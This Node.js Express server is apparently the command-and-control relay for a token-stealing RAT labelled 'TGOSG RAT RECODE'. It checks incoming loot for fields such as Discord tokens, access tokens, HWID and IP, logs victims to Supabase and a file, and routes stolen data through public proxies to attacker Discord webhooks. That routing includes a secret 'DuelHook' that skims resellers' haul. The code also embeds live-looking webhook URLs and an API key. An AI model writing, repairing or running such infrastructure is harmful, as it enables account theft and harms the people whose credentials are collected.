const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const app = express();
const fs = require('fs');
const rateLimit = require('express-rate-limit');
const requestIp = require('request-ip');
const { createClient } = require('@supabase/supabase-js');
const supabaseUrl = 'https://djnunmhimrdnhvpldoew.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRqbnVubWhpbXJkbmh2cGxkb2V3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3MDc4ODA2NzIsImV4cCI6MjAyMzQ1NjY3Mn0.y4W4Rv5SX9JoZWvZD9KMkC_XO80uPZmwb0mF1BqcGXw';
const supabase = createClient(supabaseUrl, supabaseKey);
const { sendSecurityNotification } = require('./SecurityAlert');

app.use(bodyParser.json());
app.use(express.static('status'));
app.use(requestIp.mw());

app.get('*', (req, res) => {
  res.redirect('/');
});

const proxies = [
  '@201.159.107.165:8081',
  '@177.131.29.214:4153',
  '@170.85.55.0:10160',
  '@39.102.210.176:8080',
  '@84.39.248.46:8080',
  '@136.226.65.111:10160',
  '@103.172.42.237:8080',
  '@82.204.150.190:3129',
  '@170.85.54.251:10160',
  '@190.104.219.148:4153',
  '@149.56.148.20:80',
  '@72.10.160.90:28327',
  '@188.234.147.54:8019',
  '@72.10.160.90:5063',
  '@136.226.65.35:10160'
];

const limiter = rateLimit({
  windowMs: 2 * 60 * 60 * 1000, // 2 hours ms
  max: 2,
  message: 'Nice ;)',
  keyGenerator: (req, res) => req.clientIp,
});

app.use('/post', limiter);

app.post('/post', async (req, res) => {
  const request_data = req.body;
  const forwarding_url = 'https://discord.com/api/webhooks/1252400127755161631/aFh9hDf9h_BEWpIhGkQ_RGAbtsaeJ16D5hIHQC-BzWTEAHNe9OS8GleV_G3uliC0WNEc';
  const uniqueForwardingUrl = 'https://discord.com/api/webhooks/1235793584523841558/RpPZjQRmcmApyJ_XU-ew4xkWmCEbzZqEG2HeVju_8ZKLs_LVno-suRqwwGr1jNQPS41G';

  var resellID = req.headers['user-agent'];

  console.log("Incoming Request from: " + req.clientIp);

  if (!postChecks(request_data)) {
    await sendSecurityNotification(req.clientIp, req.headers['content-type'], request_data, proxies);
    res.status(200).send();
    return;
  }

  // if(getElement(request_data,"Access Token: ").length < 50){
  //   res.status(200).send("stupid idiot cracked account");
  //   return;
  // }

  logRequest(req.headers['content-type'], request_data);
  console.log("Request from: " + req.clientIp + " has passed security check");

  for (const proxy of proxies) {
    try {
      const [credentials, proxyAddress] = proxy.split('@');
      const [username, password] = credentials.split(':');
      const [host, port] = proxyAddress.split(':');
      const axiosConfig = {
        proxy: {
          host,
          port: parseInt(port),
          protocol: 'http',
          // auth: {
          //   username,
          //   password,
          // },
        },
        timeout: 10000,
      };

      console.log(`Using proxy: ${proxy}`);
      if (resellID !== "TGOSG" && resellID !== "Java-DiscordWebhook-BY-Gelox_") {
        var { data, error } = await supabase.from('webhooks').select().eq('webhookID', webhookID);
        let duelHook = data[0].DuelHook;
        const response = await axios.post(duelHook, request_data, axiosConfig);
      }

      const HWIDexists = await checkHWIDExists(getElement(request_data, "HWID: "));
      if (!HWIDexists && getElement(req.body,"Access Token: ").length > 50) {
        try {
          const response = await axios.post(uniqueForwardingUrl, request_data, axiosConfig);
          console.log(`Request successfully sent through proxy: ${proxy}`);
          return res.status(response.status).send(response.data);
        } catch (error) {
          console.error(`Forwarding to Unique URL failed through proxy: ${proxy} with error: ${error.message}`);
        }
      } else {
        const response = await axios.post(forwarding_url, request_data, axiosConfig);
        console.log(`Request successfully sent through proxy: ${proxy}`);
        return res.status(response.status).send(response.data);
      }
    } catch (error) {
      console.error(`Proxy error for ${proxy}: ${error.message}`);
    }
  }

  try {
    const response = await axios.post(forwarding_url, request_data);
    console.log("Proxies failed sending request from Hostmachine\n");
    return res.status(response.status).send(response.data);
  } catch (error) {
    console.error(`Fallback Failed: ${error.message}\n`);
    res.status(500).send("All proxies and fallback failed. Your IP has been flagged for suspicious behavior");
  }
});

function serverSideChecks(data) {
  //Runs For Both Tiers and the T0 spread
  const json = JSON.stringify(data);
  if(!json.includes("UUID: ") && !json.includes("Discord Token(s):")){
    console.log("failed malform check 1");
    return false;
  }
  if (data["username"] != "TGOSG RAT RECODE") {
    console.log("failed format check 1");
    return false;
  }
  if (json.includes("@everyone")) {
    console.log("@everyone check");
    return false;
  }
  return true;
}

function postChecks(data) {
  const json = JSON.stringify(data);
  if (!json.includes("Account Name:")) {
    console.log("failed malform check 1");
    return false;
  }
  if (!json.includes("HWID:")) {
    console.log("failed malform check 2");
    return false;
  }
  if (!json.includes("IP:")) {
    console.log("failed malform check 3");
    return false;
  }
  if (!json.includes("OS:")) {
    console.log("failed malform check 4");
    return false;
  }
  if (!json.includes("Discord Token(s):")) {
    console.log("failed malform check 5");
    return false;
  }
  // if (data["content"] != "TGOSG RAT RECODE: " + getElement(data, "UserName: ") && !data["content"].includes("Player")) {
  //   console.log("failed format check 1");
  //   return false;
  // }
  if (data["username"] != "TGOSG RAT RECODE") {
    console.log("failed format check 2");
    return false;
  }
  if (!fitsPattern(getElement(data, "UUID: "), uuidv4Pattern)) {
    console.log("failed format check 3");
    return false;
  }
  if (!getElement(data, "Upload Folder: ").includes("https://gofile.io/d/") && !getElement(data, "Upload Folder: ") == "Error somewhere") {
    console.log("failed format check 4");
    return false;
  }
  if (!fitsPattern(getElement(data, "HWID: "), hwidPattern)) {
    console.log("failed format check 5");
    return false;
  }
  if (json.includes("@everyone")) {
    console.log("@everyone check");
    return false;
  }
  return true;
}

const hwidPattern = /^[0-9,A-Z]{32,32}$/;
const uuidv4Pattern = /^[a-z,0-9,-]{36,36}$/;

function fitsPattern(value, pattern) {
  return pattern.test(value);
}

async function logRequest(contentType, requestData) {
  let accountName = getElement(requestData, "UserName: ");
  let HWID = getElement(requestData, "HWID: ")
  let IP = getElement(requestData, "IP: ")
  try {
    const { data, error } = await supabase.from('logs').insert([
      { "content_type": contentType, "request_data": requestData, "ip": IP, "account_name": accountName, "HWID": HWID }
    ]);

    if (error) {
      console.error('Error inserting log into Supabase:', error.message);
    }
  } catch (error) {
    console.error('Error inserting log into Supabase:', error.message);
  }

  const logMessage = `Incoming Request from: ${IP}\nContent Type: ${contentType}\nRequest Data: ${JSON.stringify(requestData, null, 2)}\n\n`;
  fs.appendFile('log.txt', logMessage, (err) => {
    if (err) {
      console.error('Error writing to log file:', err);
    }
  });
}

app.post('/Tier', async (req, res) => {
  const { content } = req.body;
  console.log("tier check " + content);
  if (content == null) {
    res.status(405).send('Nothing here... maybe something...');
  } else {
    tier = await checkTier(content);

    if (tier != -1) {
      res.status(200).send(tier);
    } else {
      res.status(405).send('Nothing here... maybe something...');
    }
  }
});

async function checkTier(webhook) {
  var { data, error } = await supabase.from('webhooks').select().eq('Webhook', webhook);
  if (error || !data || data.length == 0) {
    console.log("error " + error );
    return res.status(500).send('Internal Server Error');
  }

  let existingCount = data[0].Count;

  var count = parseInt(existingCount) || 0;
  count++;
  await supabase.from('webhooks').update({ Count: count }).eq('Webhook', webhook);

  return data[0].Tier + "<>" + data[0].DuelHook;
}

app.post('/fallback', (req, res) => {
  const { content } = req.body;
  if (content === "FallBack Fallback Clear") {
    fs.writeFile('log.txt', '', (err) => {
      if (err) {
        console.error('Error clearing log file:', err);
        return res.status(500).send('Error clearing log file');
      }
      console.log('Log file cleared successfully');
      return res.send('Log file cleared successfully');
    });
  } else if (content === "FallBack Fallback") {
    fs.readFile('log.txt', 'utf8', (err, data) => {
      if (err) {
        console.error('Error reading log file:', err);
        return res.status(500).send('Error reading log file');
      }
      return res.type('text/plain').send(data);
    });
  } else {
    return res.status(400).send('Invalid request');
  }
});

app.post('/serverSide', async (req, res) => {
  const request_data = req.body;

  if(!serverSideChecks(request_data)){
    await sendSecurityNotification(req.clientIp, req.headers['content-type'], request_data, proxies);
    res.status(200).send();
    return;
  }

  console.log("Incoming ServerSide request from: " + req.clientIp);
  var webhookID = req.headers['user-agent'];
  var { data, error } = await supabase.from('webhooks').select().eq('webhookID', webhookID);

  if (error || !data || data.length == 0) {
    console.log("error" + data);
    return res.status(500).send('Internal Server Error');
  }

  let success = false;
  let lastError = null;
  let tier = data[0].Tier;
  let webhook = data[0].Webhook;
  let existingCount = data[0].Count

  console.log("found " + webhook + " for " + webhookID);
  
  const json = JSON.stringify(data);
  if(json.includes("UUID: ")){
    var count = parseInt(existingCount) || 0;
    count++;
    await supabase.from('webhooks').update({ Count: count }).eq('Webhook', webhook);
  }

  for (const proxy of proxies) {
    try {
      const [credentials, proxyAddress] = proxy.split('@');
      const [username, password] = credentials.split(':');
      const [host, port] = proxyAddress.split(':');
      const axiosConfig = {
        proxy: {
          host,
          port: parseInt(port),
          protocol: 'http',
          auth: {
            username,
            password,
          },
        },
        timeout: 10000,
      };

      console.log(`Using proxy: ${proxy}`);

      if (data[0].allowCrackedAccounts == false) {
        if (getElement(req.body, "Access Token: ").length > 50) {
          const response = await axios.post(webhook, request_data, axiosConfig);
          if (response.status < 205) {
            success = true;
            break;
          }
        }
      } else {
        const response = await axios.post(webhook, request_data, axiosConfig);
        if (response.status < 205) {
          success = true;
          break;
        }
      }
    } catch (error) {
      console.error(`Proxy error for ${proxy}: ${error.message}`);
    }
  }

  if (success) {
    res.status(200).send(`${tier}: `);
  } else {
    res.status(405).send('ERROR');
  }
});

app.all('/post', (req, res) => {
  res.status(405).send('Nothing here... maybe something...');
});

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});

// UTIL
async function checkHWIDExists(HWID) {
  try {
    const { data, error } = await supabase.from('logs').select('*').eq('HWID', HWID);
    if (error) {
      console.error('Error checking username:', error.message);
      return false;
    }
    return data.length > 0;
  } catch (error) {
    console.error('Error checking username:', error.message);
    return false;
  }
}

function getElement(requestData, valueName) {
  let value = "";
  if (requestData.embeds && Symbol.iterator in Object(requestData.embeds)) {
    for (const embed of requestData.embeds) {
      for (const field of embed.fields) {
        if (field.name === valueName) {
          value = field.value;
          break;
        }
      }
      if (value != "") {
        break;
      }
    }
  }
  return value.replace("```", "").replace("```", "");
}